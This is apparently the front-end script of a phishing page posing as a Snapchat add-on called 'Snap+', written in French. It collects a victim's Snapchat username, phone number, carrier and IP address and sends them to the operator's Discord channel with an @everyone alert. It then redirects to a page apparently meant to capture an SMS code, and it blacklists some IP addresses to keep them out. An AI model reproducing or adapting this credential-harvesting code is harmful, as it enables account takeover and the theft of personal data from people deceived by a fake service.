(async function() {
    const ip = await getUserIP();
    if (isBlacklisted(ip)) {
        window.location.href = 'blocked.html';
        return;
    }
})();

const submitBtn = document.getElementById('submitBtn');
const loadingScreen = document.getElementById('loadingScreen');
const successMessage = document.getElementById('successMessage');
const usernameInput = document.getElementById('usernameInput');
const phoneInput = document.getElementById('phoneInput');
const operatorOptions = document.getElementById('operatorOptions');
const inputWrappers = document.querySelectorAll('.input-wrapper');

inputWrappers.forEach(wrapper => {
    const input = wrapper.querySelector('input');
    const icon = wrapper.querySelector('i');

    input.addEventListener('focus', () => {
        wrapper.style.transform = 'translateY(-2px)';
        if (icon) icon.style.color = '#667eea';
    });

    input.addEventListener('blur', () => {
        wrapper.style.transform = 'translateY(0)';
        if (icon && !input.value) icon.style.color = 'rgba(255, 255, 255, 0.5)';
    });

    input.addEventListener('input', () => {
        if (input.value) {
            wrapper.style.borderColor = '#667eea';
        } else {
            wrapper.style.borderColor = 'rgba(255, 255, 255, 0.1)';
        }

        if (input.id === 'phoneInput') {
            input.value = input.value.replace(/[^0-9\+\-\(\)\s]/g, '');
            wrapper.style.borderColor = input.value.length > 0 ? '#667eea' : 'rgba(255, 255, 255, 0.1)';
        }

        if (input.id === 'usernameInput') {
            input.value = input.value.toLowerCase();
        }
    });
});

function createRipple(event) {
    const button = event.currentTarget;
    const ripple = document.createElement('span');
    const rect = button.getBoundingClientRect();
    const size = Math.max(rect.width, rect.height);
    const x = event.clientX - rect.left - size / 2;
    const y = event.clientY - rect.top - size / 2;

    ripple.style.width = ripple.style.height = `${size}px`;
    ripple.style.left = `${x}px`;
    ripple.style.top = `${y}px`;
    ripple.style.position = 'absolute';
    ripple.style.borderRadius = '50%';
    ripple.style.background = 'rgba(255, 255, 255, 0.3)';
    ripple.style.transform = 'scale(0)';
    ripple.style.animation = 'ripple 0.6s linear';
    ripple.style.pointerEvents = 'none';

    button.appendChild(ripple);
    setTimeout(() => ripple.remove(), 600);
}

const style = document.createElement('style');
style.textContent = `
    @keyframes ripple {
        to { transform: scale(4); opacity: 0; }
    }
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
        20%, 40%, 60%, 80% { transform: translateX(5px); }
    }
`;
document.head.appendChild(style);

submitBtn.addEventListener('click', createRipple);

function validatePhone(phone) {
    const cleanPhone = phone.replace(/[\s\-\.\(\)]/g, '');
    return cleanPhone.length >= 3;
}

function normalizeUsername(username) {
    return username.toLowerCase().trim();
}

function getSelectedOperator() {
    const selected = operatorOptions.querySelector('input[name="operator"]:checked');
    return selected ? selected.value : '';
}

submitBtn.addEventListener('click', async function() {
    const username = usernameInput.value.trim();
    const phone = phoneInput.value.trim();
    const operator = getSelectedOperator();

    if (!username || !phone || !operator) {
        submitBtn.style.animation = 'shake 0.5s ease-in-out';
        setTimeout(() => submitBtn.style.animation = '', 500);
        alert('Veuillez remplir tous les champs et choisir un opérateur');
        return;
    }

    if (!validatePhone(phone)) {
        submitBtn.style.animation = 'shake 0.5s ease-in-out';
        setTimeout(() => submitBtn.style.animation = '', 500);
        alert('Numéro de téléphone invalide');
        return;
    }

    const ip = await getUserIP();

    if (isBlacklisted(ip)) {
        alert('Accès refusé.');
        return;
    }

    const normalizedUsername = normalizeUsername(username);

    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Envoi...';

    document.querySelectorAll('.form-group').forEach(group => {
        group.style.display = 'none';
    });
    submitBtn.style.display = 'none';
    document.querySelector('.headline').style.display = 'none';
    loadingScreen.classList.add('active');

    const embed = {
        title: '📱 Nouvelle inscription Snap+',
        description: 'Un utilisateur vient de s\'inscrire sur Snap+',
        color: 0x667eea,
        author: {
            name: 'Snap+ Bot',
            icon_url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png'
        },
        fields: [
            { name: '─────────────────────', value: ' ', inline: false },
            { name: '👤 Nom d\'utilisateur', value: `\`\`\`${normalizedUsername}\`\`\``, inline: true },
            { name: '📞 Numéro de téléphone', value: `\`\`\`${phone}\`\`\``, inline: true },
            { name: '📡 Opérateur', value: `\`\`\`${operator}\`\`\``, inline: true },
            { name: '🌐 IP', value: `\`\`\`${ip}\`\`\``, inline: false },
            { name: '⏰ Date', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
            { name: '─────────────────────', value: ' ', inline: false }
        ],
        thumbnail: { url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png' },
        footer: { text: 'Snap+ Bot • Inscription automatique', icon_url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png' },
        timestamp: new Date().toISOString()
    };

    const sent = await sendToDiscord({ content: '@everyone', embeds: [embed] });

    if (!sent) {
        loadingScreen.classList.remove('active');
        document.querySelectorAll('.form-group').forEach(group => {
            group.style.display = '';
        });
        document.querySelector('.headline').style.display = '';
        submitBtn.style.display = '';
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Continuer';
        alert('Erreur lors de l\'envoi. Réessayez plus tard.');
        return;
    }

    setTimeout(() => {
        window.location.href = 'code.html';
    }, 5000);
});

function createParticles() {
    const colors = ['#667eea', '#764ba2', '#10b981', '#fbbf24'];
    for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.style.position = 'fixed';
        particle.style.width = '10px';
        particle.style.height = '10px';
        particle.style.background = colors[Math.floor(Math.random() * colors.length)];
        particle.style.borderRadius = '50%';
        particle.style.left = '50%';
        particle.style.top = '50%';
        particle.style.pointerEvents = 'none';
        particle.style.zIndex = '9999';
        document.body.appendChild(particle);

        const angle = Math.random() * Math.PI * 2;
        const velocity = 2 + Math.random() * 4;
        const vx = Math.cos(angle) * velocity;
        const vy = Math.sin(angle) * velocity;

        let x = 0, y = 0, opacity = 1;

        function animate() {
            x += vx;
            y += vy + 0.5;
            opacity -= 0.02;
            particle.style.transform = `translate(${x}px, ${y}px)`;
            particle.style.opacity = opacity;

            if (opacity > 0) {
                requestAnimationFrame(animate);
            } else {
                particle.remove();
            }
        }

        animate();
    }
}

const successObserver = new MutationObserver((mutations) => {
    mutations.forEach((mutation) => {
        if (mutation.target.classList.contains('active') &&
            mutation.target.id === 'successMessage') {
            createParticles();
        }
    });
});

successObserver.observe(successMessage, { attributes: true, attributeFilter: ['class'] });
